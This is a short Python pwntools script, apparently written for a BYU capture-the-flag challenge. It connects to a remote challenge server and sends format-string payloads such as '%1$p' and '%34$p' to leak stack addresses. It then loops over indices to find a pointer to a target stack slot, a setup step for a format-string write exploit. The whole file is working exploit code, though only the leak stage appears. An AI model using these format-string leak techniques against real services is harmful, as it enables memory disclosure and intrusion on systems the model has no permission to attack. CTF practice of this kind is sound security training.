from pwn import *

# Set context
context.arch = 'amd64'

def find_got_ptr():
    r = remote('chals.cyberjousting.com', 1367)
    payload = b'byuctf{welcome_to_rev_fellas}|%1$p|%34$p'
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'|')
    i1 = int(r.recvuntil(b'|', drop=True), 16)
    i34 = int(r.recvuntil(b'.', drop=True), 16)
    r.close()
    
    # i1 is Addr(Index 20)
    # Addr(Index 39) = i1 + (39-20)*8 = i1 + 152
    target_addr = i1 + 152
    print(f"Target Addr(Index 39): {hex(target_addr)}")
    
    # Let's see if any index points here.
    # We'll leak many indices and check.
    for start in range(1, 100, 10):
        r = remote('chals.cyberjousting.com', 1367)
        payload = b'byuctf{welcome_to_rev_fellas}'
        for i in range(start, start + 10):
            payload += f"|%{i}$p".encode()
        r.sendlineafter(b'?', payload)
        r.recvuntil(b'Correct! The flag is ')
        data = r.recvline().decode().strip()
        leaks = data.split('|')[1:]
        r.close()
        for i, l in enumerate(leaks):
            try:
                v = int(l, 16)
                if v == target_addr:
                    print(f"Index {start + i} points to Index 39!")
            except: pass

find_got_ptr()
